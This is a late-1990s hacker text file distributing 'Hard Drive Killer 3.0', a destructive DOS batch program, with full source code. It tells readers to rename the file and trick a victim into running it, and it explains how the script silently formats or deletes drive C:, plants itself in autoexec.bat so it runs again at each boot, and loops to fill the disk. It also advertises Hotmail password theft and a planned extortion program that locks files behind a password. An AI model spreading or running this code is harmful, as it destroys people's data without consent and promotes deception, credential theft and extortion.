  
		       HARD DRIVE KILLER VERSION 3.0


:INSTRUCTIONS ON USE:
Just send the hdk_v3.bat file to the person you want to kill, and ask them to run it. :TIP: Change the file name and tell them it's something else (something they would like). That's all. Then wait for them to die!

NOTE: The http://www.hackers.au.com web site will be effective in early October 1998.

MY DETAILS:
E-mail   : munga-bunga@usa.net
ICQ #    : 1333 0592
Phone #  : You Wish!!!!

:SIMPLE ANALSYIS (anyone could understand).

Firstly, this program assumes the victim is running a PC with a drive c:\.

Today we are talking about a program called Hard Drive Killer 3.0. It is a creation of Munga Bunga (ME). Now down to business. This file totally eliminates a hard drive. When the batch program is excecuted, it formats/erases all data on drive C:\ of any PC in a few seconds (3-4 to be exact). It can take off gigabyte's of information in just a few seconds! And guess what, I'm sure we all know about the autoexec.bat file, this is a file that is always automatically run when dos starts up (just before Windows starts running). Well, the hard drive killer inserts special codes into this file. When you run the hdk_v3.bat program, it starts to kill off your hard drive, however, just in case something goes wrong or the process is interrupted, it also inserts the same/similar code into the autoexec.bat file so that the next time the user or anyone else turns the computer on, the process continues from where it left off. So there is no escape. Once it is run the termination of the individual is inevitable. They are gone for good and there is nothing they can do to recover the information. You are now thinking "what about the Norton Utilities" - well Norton can't do shit, all Mr. Norton can do is lick his bold head. Nothing can retrieve the information because we kill the FAT with the loop under the ":killfat" label. Read it and see that it creates and infinite amount of directories and subdirectories called "nasty" and a file called "yourgone.txt" with a message in it. They are continually looping by making subdirectories under one another. So no unformat utility can do shit. Sorry about the inappropriate use of language, but as you can see, I don't like Norton. Hmmmmm!

You can download this program and it's updated version from . . .

http://www.hackers.au.com (the bug free updated version is only at this web site, the source code has been rewritten since this article so you must download it from there if you want it)!

This site also teaches you 3 methods of getting any of  9 million Hotmail passwords!

NOTE OF FUTURE PROGRAMS: I am also working on a HUGE program that can tie an individual up for a specified amount of time. We can crash someone's hard drive and lock up all their important and personal files (including Operating System files) so they won't be able to work. Then they must attain a password to undo the process (and only you will know/choose that password). You can even bribe them for anything because they will be desperate to get the password. Look for this program at the above web site when it is completed. It should be by the end of 1998. (http://www.hackers.au.com).

DETAILED/ADVANCED ANALYSIS OF HOW THE PROGRAM WORKS:

THIS ASSUMES YOU HAVE A BASIC UNDERSTANDING OF (DOS)/(BATCH PROGRAMMING)!

When run, all the person sees is "PLEASE WAIT WHILE PROGRAM LOADS . . .", nothing else. Why? Well because there is something called the "NUL" device. This is a nowhere land on the computer, a terminal/device that with no defined storage location, a dead end, what ever goes there never comes back! So instead of letting the output go to the screen (the default location) we let it go to the NUL device with the >nul redirection line at the end. So then now one sees it.

The autoexec.bat file is then made "unhidden" and "non-read only" (so it can be manipulated). Then the configuring of the autoexec.bat file starts. The line "echo format c: /q /u /autotest >nul >c:\autoexec.bat" is very important, here is what it does: Anything after the word echo is normally seen on the screen. But we have directed it's output to the c:\autoexec.bat file. That file (autoexec.bat) will contain the following code "format c: /q /u /autotest >nul". The @echo off before that just stops the commands from being displayed, and the >nul redirection makes the results from the command disappear (don't get the two confused). It does a bit of configuring with the autoexec.bat file. However, you should note that it only makes the bare minimum insertion of code at the start of the program, so that the program can quickly get up and running without any delay. After the main program is done running, the FULL PROGRAM CODE is reinserted into the autoexec.bat file! This can take about one-two seconds. The whole process should be less then 5 seconds if the format works, if it doesn't then we are left to the deltree (deleting files) command, this may take a few minutes. But i have ensured that format works. Read on to see how...

If the victim has weird config.sys specifications and dos commands are not set with the "set path" command to a given path, and if the format file isn't in your root directory you cannot run the format command, so this program looks into the most common directories (c:\dos for Windows 3.1 users and c:\windows\command for Windows 95/NT/98 users). The files are then run from there. Let's take a look at an example. Look at the ":dosform" label. Prior to that label being excecuted we have a ":form" label which (in English) says that "if the file format.* (* meaning anything from 0 to 3 characters - a wild card) exist in the c:\dos directory, then go to the ":dosform" lable". And the ":dosform" lable works under the assumption that there is a file called format.* in the dos directory. So it carries out the format operation accordingly. There are a few things like that in this program, they carry useful purposes. After extensive testing of the victims computer, the whole code is inserted into the autoexec.bat file fully with multiple "echo" commands.

Notice that on the 8th line of the program there is something saying "echo dummy variable >c:\dvar.txt" , this code creates a useless file for testing purposes. In Mathematics, a dummy variable is defined as a variable which is of no significance but is only used for the representation of another variable, function or equation (situation). So the file/variable does not contain a function but it is used to represent whether something exist or not (situation). It is not important what you use as the variable because it is just a "dummy variable". We create a file called dvar.txt with the words "dummy variable" in it (the words are not important, it can be anything you want it to be), it's purpose is to create a file with name dvar.txt. After the process/program runs, if this file still exist then it means the program didn't format the drive (otherwise it would have been gone) - so then the program elapses into the deleting phase (which is the last resort) to make sure the mother f***er is killed OFF once and for all!!!! This is implemented with the line "if exist dvar.txt goto dtree" if this is true, then the ":dtree" label is run, if it is not then the ":inform" label is run which gives a message and inserts the full program code into the computer (c:\autoexec.bat file to be exact). The same message also appears when the computer is restarted because it is stored in a file called hdkiller.txt which is called (and displayed with the type command) from the autoexec.bat file upon restarting the computer.

A note about the format command. The /q switch means "quick" format, the u switch means "unconditional " format (so it can never be reversed), the /h command makes your computer work like a MTS (Multi Tasking System), it runs the format in the background while people are doing other stuff and not aware of what is happening and the /autotest switch does not prompt the user for whether they are sure they want to format their system or not. Also don't use c:\ with the format switch, it only accepts c: (no slash). As for the deltree command, the /y switch also does what the /autotest switch does in the format command, it does not prompt the user.

A NOTE FROM PERSONAL EXPERIENCE: I killed myself with my own program . . .

Ok guys, I once ran the hdkiller version 2.0 program on my computer. It cost me all my data and I had to pay $600 to partially recover some data. Yeah, this is true, notice this was with the version 2.0 of the Hard Drive Killer, if you use 2.1 or 3.0, your sure to be expected to pay over $6,000 to get some data back. The data your get back if often corrupted too. My data recovery specialist (Brian) said, and I quote: "Your Hard Drive experienced a traumatically massive attack, and we were extremely lucky to get back what we did"! Yeah, so just be careful with it ok guys/girls? Don't run it on your own system.

::ADDITIONS TO VERSION 2.1 OF THE HARD DRIVE KILLER::

I have included a loop in the ":killfat" label, so that it kills off the FAT, no, we are not talking about fat cells, we are talking about the computers FAT16 or whatever it uses. When we kill the FAT, the Norton utilities and any other nerdy program can't undo the situation because we have killed the FAT and manipulated the drive big time. What does this mean, it means the bugger is gone for good and they can't do shit about it. Suffer to them!

There you go, fast, efficient and well worked out, try it for yourself. But hey, just don't hit innocent people with it ok guys/girls? Hit the sleazy butt heads only, those who deserve it. I make many more of this sort of stuff and better, so any questions e-mail me at munga-bunga@usa.net or go to the web site at http://www.hackers.au.com to get the latest version of this destructive file and anything else!

::ADDITIONS TO VERSION 3.0 OF THE HARD DRIVE KILLER::

Version 3.0 is the best, better then ever. Version 1.0, 2.0 and 2.1 had some bugs in it. It did not destroy you when you loaded it initially, you had to wait till the person restarted their computer. Now what we have is this, when running your computer, it can format in the background while you are running your system. If that doesn't work, the deltree command will make sure to take off heaps of memory from your computer. It now works properly, better then ever. So now you will start seeing people die right in front of your eyes, and also when they restart their computer. If you are on ICQ, you can watch them die right then and there, watch as they go from "online" to "offline".

Here is the source code...

@echo off
rem Hard Drive Killer Version 3.0!!!!
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

call attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo dummy variable >c:\dvar.txt

:form
call format c: /q /u /autotest >nul
if exist c:\dos\format.* goto dosform
if exist c:\windows\command\format.* goto winform
goto de

:dosform
cd\dos >nul
call format c: /h /q /u /autotest >nul
cd\ >nul

:winform
cd\windows\command >nul
call format c: /h /q /u /autotest >nul
cd\ >nul
goto inform

:de
if exist c:\dvar.txt goto dtree
goto inform

:dtree
call deltree /y c: >nul
if exist c:\dos\deltree.* goto deldos
if exist c:\windows\command\deltree.* goto delwin
goto inform

:deldos
cd\dos
call deltree /y c: >nul
cd\

:delwin
cd\windows\command >nul
call deltree /y c: >nul
cd\ >nul


:inform

cls
echo You have been hit by the Hard Drive Killer, written by Munga Bunga. >c:\hdkiller.txt
echo HD Killer is a Munga Bunga Production. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo Here is a message to all you but lickers. . . >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo FREE KEVIN MITNIC [Munga Bunga]. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo If you were destroyed by this HDkiller program, then you would have >>c:\hdkiller.txt
echo deserved it. Die you mother fuckers!!!! >>c:\hdkiller.txt


rem The following rewrites the code into the autoexec.bat file.

echo @echo off >c:\autoexec.bat
echo cls >>c:\autoexe.bat

echo :form
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
echo if exist c:\dos\format.* goto dosform >>c:\autoexec.bat
echo if exist c:\windows\command\format.* goto winform >>c:\autoexec.bat
echo goto de >>c:\autoexec.bat

echo :dosform >>c:\autoexec.bat
echo cd\dos >nul >>c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :winform >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :de >>c:\autoexec.bat
echo if exist c:\dvar.txt goto dtree >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :dtree >>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo if exist c:\dos\deltree.* goto deldos >>c:\autoexec.bat
echo if exist c:\windows\command\deltree.* goto delwin >>c:\autoexec.bat

echo :deldos >>c:\autoexec.bat
echo cd\dos >>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat

echo :delwin >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :write >>c:\autoexec.bat
echo type hdkiller.txt >>c:\autoexec.bat
echo c:\ >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo :nasty >>c:\autoexec.bat
echo md nasty >>c:\autoexec.bat
echo cd nasty >>c:\autoexec.bat
echo echo You're Gone @$$ hole!!!! >yourgone.txt >>c:\autoexec.bat
echo goto nasty >>c:\autoexec.bat
echo pause >>c:\autoexec.bat

rem Rewriting of code to the autoexec.bat file is complete.

c:\ >nul
cd\ >nul
:killfat
md nasty >nul
cd nasty >nul
echo You're Gone @$$ hole!!!! >yourgone.txt >nul
goto killfat

:end




That is the end of the program, any questions email me at munga-bunga@usa.net or go to the web site at http://www.hackers.au.com to get the latest version of this destructive file!
